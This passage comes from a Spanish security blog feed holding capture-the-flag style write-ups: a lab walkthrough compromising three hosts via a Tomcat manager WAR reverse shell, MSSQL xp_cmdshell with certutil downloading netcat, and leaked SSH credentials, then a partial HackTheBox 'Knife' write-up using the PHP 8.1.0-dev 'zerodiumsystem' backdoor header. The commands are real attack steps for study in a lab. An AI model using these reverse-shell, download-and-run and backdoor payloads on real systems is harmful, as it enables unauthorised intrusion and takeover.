  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;135&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;msrpc&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;139&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;SMB, recursos compartidos del sistema&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;445&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;SMB, recursos compartidos del sistema&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;1433&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;MicroSoft SQL&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;7680&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;pando-pub(ni idea)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;49664-49670&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;msrpc&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;49943&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;MicroSoft SQL(otra vez)&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Como he hecho un escaneo de la versión y el servicio además de lanzar unos scripts básicos de enumeración en el mismo escaneo, ya no necesito usar herramientas como &lt;a href=&quot;https://pastebin.com/tYpwpauW&quot;&gt;extractPorts&lt;/a&gt;.&lt;/p&gt;

&lt;h1 id=&quot;maquina1&quot;&gt;Explotación de la 172.16.64.101&lt;/h1&gt;

&lt;p&gt;Teniendo todos los puertos podríamos empezar por la .101 por ejemplo. Si abrimos Firefox y entramos a los puertos de los servidores HTTP encontramos la misma página: &lt;img src=&quot;https://user-images.githubusercontent.com/71317374/132499799-309aa1a6-7ee5-4d28-bfe8-7eda222d89a4.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;explotación-de-un-apache-tomcat&quot;&gt;Explotación de un Apache Tomcat&lt;/h2&gt;

&lt;p&gt;Los servidores Apache Tomcat(puertos 8080 y 9080) tienen la ruta /manager/html, que te da acceso a la administración del sitio.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/132499957-ac6e1dc9-9daa-4e50-9483-14953156a10e.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;:/ No tenemos credenciales.&lt;/p&gt;

&lt;p&gt;Si le damos a cancelar, nos lleva a una página con un 401 Unauthorized y unas credenciales:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/132500059-7ae5f09f-6240-436a-9bdc-639b997d6ac3.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y si las introducimos tenemos acceso a la administración del sitio.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/132500156-bb495740-c4c6-4e42-bf51-1fbabcb1a18d.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Aquí puedes subir archivos .war que pueden ser maliciosos, así que podríamos obtener una reverse shell :0&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; java/jsp_shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;172.16.64.10 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;443 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; war &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; eeeee.war
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Generamos un archivo .war llamado eeeee.war y lo subimos a la página web usando la sección de Deploy&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/132502557-3c8dffe0-a5ff-4b5a-9ac4-ad7f4497c30d.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Cuando le demos a Deploy aparecerá el nombre de nuestro archivo listado en Applications, pero antes vamos a la consola y abrimos un listener de netcat en el puerto 443
con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -nlvp 443&lt;/code&gt;, y entonces le damos a nuestro archivo y conseguimos una reverse shell como el usuario tomcat8.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ncat &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
Ncat: Version 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org/ncat &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 172.16.64.101.
Ncat: Connection from 172.16.64.101:39542.
&lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;tomcat8
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Para tener una consola totalmente interactiva, tendríamos que hacer un &lt;a href=&quot;https://www.thehackersnow.com/tratamiento-de-una-tty/&quot;&gt;tratamiento de la TTY&lt;/a&gt;.
Ahora, hay que dirigirse a /home para recoger las flags de esta máquina, ubicadas en /home/adminels/Desktop y en /home/developer&lt;/p&gt;

&lt;h1 id=&quot;maquina2&quot;&gt;Reconocimiento de 172.16.64.140 y explotación de 172.16.64.199&lt;/h1&gt;

&lt;p&gt;Tras comprometer la 172.16.64.101, nos dirigimos a la 172.16.64.140, que tiene un servidor HTTP corriendo el el puerto 80, así que vamos a fuzzearlo con la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; a ver si encontramos algo.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 75 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/directory-list-2.3-medium.txt 172.16.64.140/FUZZ
&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Wfuzz 3.1.0 - The Web Fuzzer                         &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;

Target: http://172.16.64.140/FUZZ
Total requests: 220560

&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;
ID           Response   Lines    Word       Chars       Payload
&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;
000000039:   301        9 L      28 W       312 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;img&quot;&lt;/span&gt;
000000553:   401        14 L     54 W       460 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;project&quot;&lt;/span&gt;
000000550:   301        9 L      28 W       312 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;css&quot;&lt;/span&gt;

Total &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 28.95585
Processed Requests: 7961
Filtered Requests: 7944
Requests/sec.: 274.9357
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Entre todos, el que destaca es /project, si vamos ahí nos encontramos con un inicio de sesión.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/132509149-aab25095-2e71-44b7-930f-39a153fd6d43.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si introducimos las credenciales admin:admin nos autentica en la esta web, que está configurada por defecto.
Si hacemos fuzzing a /project con las credenciales admin:admin para autenticarnos(o el header “Authorization: Basic YWRtaW46YWRtaW4=”) encontramos /backup, y si volvemos a fuzzear en /backup encontramos /test, donde hay unos documentos de texto.&lt;/p&gt;

&lt;p&gt;Solo el tercero/sdadas.txt contiene unas credenciales para un servidor MSSQL(ubicado en la 172.16.64.199) y una ruta con una de las flags que hay que conseguir, que estaría en http://172.16.64.140/project/354253425234234/flag.txt&lt;/p&gt;

&lt;h2 id=&quot;conseguimos-acceso-a-la-1721664199&quot;&gt;Conseguimos acceso a la 172.16.64.199&lt;/h2&gt;

&lt;p&gt;Ahora que tenemos credenciales para el servidor MSSQL del puerto 1433, podemos usar la herramienta &lt;a href=&quot;https://github.com/secureauthcorp/impacket/blob/master/examples/mssqlclient.py&quot;&gt;mssqlclient.py&lt;/a&gt; de Impacket para conectarnos con las credenciales fooadmin:fooadmin&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ mssqlclient.py fooadmin:fooadmin@172.16.64.199
Impacket v0.9.24.dev1+20210906.175840.50c76958 - Copyright 2021 SecureAuth Corporation

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Encryption required, switching to TLS
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; ENVCHANGE&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DATABASE&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Old Value: master, New Value: master
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; ENVCHANGE&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;LANGUAGE&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Old Value: , New Value: us_english
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; ENVCHANGE&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;PACKETSIZE&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Old Value: 4096, New Value: 16192
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; INFO&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;WIN10&lt;span class=&quot;se&quot;&gt;\F&lt;/span&gt;OOSQL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Line 1: Changed database context to &lt;span class=&quot;s1&quot;&gt;'master'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; INFO&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;WIN10&lt;span class=&quot;se&quot;&gt;\F&lt;/span&gt;OOSQL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Line 1: Changed language setting to us_english.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; ACK: Result: 1 - Microsoft SQL Server &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;120 7208&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Press &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;extra shell commands
SQL&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Y así llegamos al servidor SQL, del cual podemos sacar una shell con xp_cmdshell. Si escribimos “help” nos muestra una lista de comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SQL&amp;gt; &lt;span class=&quot;nb&quot;&gt;help

     &lt;/span&gt;lcd &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;path&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;                 - changes the current &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;directory to &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;path&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
     &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;                       - terminates the server process &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;and this session&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;cmd&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;          - executes cmd using xp_cmdshell
     sp_start_job &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;cmd&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;         - executes cmd using the sql server agent &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;blind&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
     &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;cmd&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;                    - executes a &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;shell cmd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Habilitamos la consola con enable_xp_cmdshell y ejecutamos comandos con xp_cmdshell. Ya que no tenemos formas de enviarnos una reverse shell sin ningún programa, descargué un binario compilado de netcat(en Kali/Parrot hay uno) y mediante un servidor HTTP con Python y certutil.exe, me lo pude descargar y enviarme un cmd.exe a mi equipo.&lt;/p&gt;

&lt;p&gt;Primero, creamos un servidor con Python en el puerto 80(si no sois root necesitaréis sudo) usando la librería http de esta forma: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python3 -m http.server 80&lt;/code&gt; y usando certutil.exe lo descargamos en la máquina
con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;certutil.exe -urlcache -f http://tuip/nc.exe nc.exe&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Tras haberlo descargado, solo habría que ejecutarlo y con el parámetro -e enviar un cmd.exe a tu ip y el puerto en el que estés escuchando para conseguir acceso a esta máquina.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rlwrap ncat &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
Ncat: Version 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org/ncat &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 172.16.64.199.
Ncat: Connection from 172.16.64.199:49678.
Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 10.0.10586]
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2015 Microsoft Corporation. All rights reserved.
&lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;maquina3&quot;&gt;Credenciales para la 172.16.64.182&lt;/h1&gt;
&lt;p&gt;Y así, estamos casi metidos hasta la cocina, ya que nos faltaría una máquina por comprometer, la 172.16.64.182, que solo tiene el puerto 22 abierto.&lt;/p&gt;

&lt;p&gt;Si miramos en el directorio Users encontramos varios usuarios, la flag está en C:\Users\AdminELS\Desktop, junto con lo que supuestamente es una clave pública de SSH:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;id_rsa.pub
&amp;lt;texto de relleno&amp;gt;jUXBbjB0c7SmXzondjmMPcamjjTTB7kcyIQ/3BQfBya1qhjXeimpmiNX1nnQ&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; rsa-key-20190313###ssh://developer:dF3334slKw@172.16.64.182:22################&amp;lt;relleno&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Pero si la miramos de cerca vemos unas credenciales para la máquina que falta por comprometer, que serían las credenciales developer:dF3334slKw. Si entramos por SSH a la 172.16.64.182, veremos la última flag y habremos comprometido todas las máquinas de esta Black Box.&lt;/p&gt;

&lt;p&gt;Si te ha gustado puedes ir a mi &lt;a href=&quot;https://github.com/binlaab&quot;&gt;github&lt;/a&gt; y darme una estrellita :)&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Knife</title>
   <link href="http://0.0.0.0:80http://0.0.0.0:80/2021/08/28/knife"/>
   <updated>2021-08-28T00:00:00+00:00</updated>
   <id>http://0.0.0.0:80/2021/08/28/knife</id>
   <content type="html">&lt;p&gt;Knife es una máquina linux de nivel fácil, creada por &lt;a href=&quot;https://app.hackthebox.eu/users/98767&quot;&gt;MrKN16H7&lt;/a&gt;, en la que vamos a explotar un bug de PHP para conseguir una RCE
y ejecutar un binario como root para convertirnos en él.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/131216908-df335eaa-0496-43e5-bc76-2d77ec7be9f9.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Según los seres vivos que hay por HackTheBox, la máquina es así:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/131216886-9c9c8b8e-6fef-4467-914f-d108e367b3d5.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Muy CTF(y es así)&lt;/p&gt;

&lt;p&gt;1 - &lt;a href=&quot;#recon&quot;&gt;Reconocimiento inicial&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;2 - &lt;a href=&quot;#deeprecon&quot;&gt;Reconocimiento profundo&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;3 - &lt;a href=&quot;#exploit&quot;&gt;Explotación&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;4 - &lt;a href=&quot;#privesc&quot;&gt;Escalada de privilegios y flag&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;recon&quot;&gt;[Reconocimiento inicial]&lt;/h1&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Nmap 7.92 scan initiated Fri Aug 27 20:20:39 2021 as: nmap -p- --open --min-rate 3000 -sS -Pn -n -v 10.10.10.242 -oG ports -oN ports.nmap&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.242
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.30s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 51068 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 14465 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
&lt;span class=&quot;c&quot;&gt;# Nmap done at Fri Aug 27 20:21:14 2021 -- 1 IP address (1 host up) scanned in 34.80 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;pequeña-explicación-de-los-parámetros-de-nmap&quot;&gt;Pequeña explicación de los parámetros de nmap&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;-p-: Escanea todos los puertos.&lt;/li&gt;
  &lt;li&gt;–open: Solo muestra los que están abiertos.&lt;/li&gt;
  &lt;li&gt;–min-rate: Envía un mínimo de paquetes por segundo para que vaya más rápido, con un número muy alto, como 10000, puede dar falsos positivos o negativos.&lt;/li&gt;
  &lt;li&gt;-sS: TCP SYN Port Scan, agiliza un poco el escaneo ya que no espera a que se complete el &lt;a href=&quot;https://networksigma.com/tcp-3-way-handshake/&quot;&gt;Three-Way Handshake&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;-Pn: Deshabilita el descubrimiento de host mediante pings a la máquina para comprobar si está activa.&lt;/li&gt;
  &lt;li&gt;-n: Deshabilita la resolución DNS&lt;/li&gt;
  &lt;li&gt;-v: Muestra los puertos a medida que los descubre&lt;/li&gt;
  &lt;li&gt;-oG: Guarda el escaneo de nmap en diferentes formatos, -oG lo guarda en formato grepeable, para luego usar la &lt;a href=&quot;https://pastebin.com/tYpwpauW&quot;&gt;función extractPorts de s4vitar&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;-oN: Guarda el escaneo como aparece por consola.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Los puertos abiertos son el 22, para obtener una shell segura(SSH), y 80, que hostea un servidor HTTP.&lt;/p&gt;

&lt;h1 id=&quot;deeprecon&quot;&gt;[Reconocimiento profundo]&lt;/h1&gt;

&lt;p&gt;Ahora que tenemos los puertos abiertos de la máquina, vamos a enumerarlos(de forma básica) y a detectar la versión y servicio que corren.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,80 10.10.10.242 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-08-28 15:47 CEST
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.242
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.049s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey:
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.41 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
|_http-title:  Emergent Medical Idea
|_http-server-header: Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;8.69 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;exploit&quot;&gt;Explotación&lt;/h1&gt;

&lt;p&gt;Si vamos a la página web, lo primero que encontramos es esto, un servidor Apache con PHP 8.1:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/131220276-fec35a9e-4b46-4692-b37f-6d8bef6caf25.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si buscamos exploits para la versión de Apache que corre no encontramos nada, en cambio, si buscamos exploits para la versión de PHP que corre, encontramos uno muy interesante que nos permite ejecutar código mediante la cabecera &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;User-Agentt: zerodiumsystem(&quot;[comando]&quot;);&lt;/code&gt; en la petición.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href=&quot;https://flast101.github.io/php-8.1.0-dev-backdoor-rce/&quot;&gt;https://flast101.github.io/php-8.1.0-dev-backdoor-rce/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Esto se puede hacer de tres formas: con un script automatizado para ello, con cURL mediante el parámetro -H o interceptando la petición con BurpSuite y añadiendo esta cabecera.&lt;/p&gt;

&lt;h2 id=&quot;explotación-con-curl&quot;&gt;Explotación con cURL&lt;/h2&gt;

&lt;p&gt;cURL tiene el parámetro -H, mediante el cual le puedes asignar más cabeceras a tu petición si son necesarias, entonces si le añadimos la cabecera &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;User-Agentt: zerodiumsystem(&quot;[comando]&quot;);&lt;/code&gt; podríamos ejecutar comandos a nivel de sistema en la máquina. El comando sería así:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ❯ curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'User-Agentt: zerodiumsystem(&quot;whoami&quot;);'&lt;/span&gt; 10.10.10.242 | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; doctype &lt;span class=&quot;nt&quot;&gt;-B&lt;/span&gt; 1 | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; doctype
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Le he añadido grep para ver únicamente el resultado del comando, que se encuentra al principio del código de la página web.&lt;/p&gt;

&lt;h2 id=&quot;explotación-con-burpsuite&quot;&gt;Explotación con BurpSuite&lt;/h2&gt;

&lt;p&gt;Con BurpSuite hay que interceptar la petición hacia la página web, y modificarla con la misma cabecera de antes. Es recomendable pasar la petición al Repeater con Ctrl + R para poder modificarla como quieras y sin tener que recargar la página cada vez que vayas a ejecutar el comando.&lt;/p&gt;

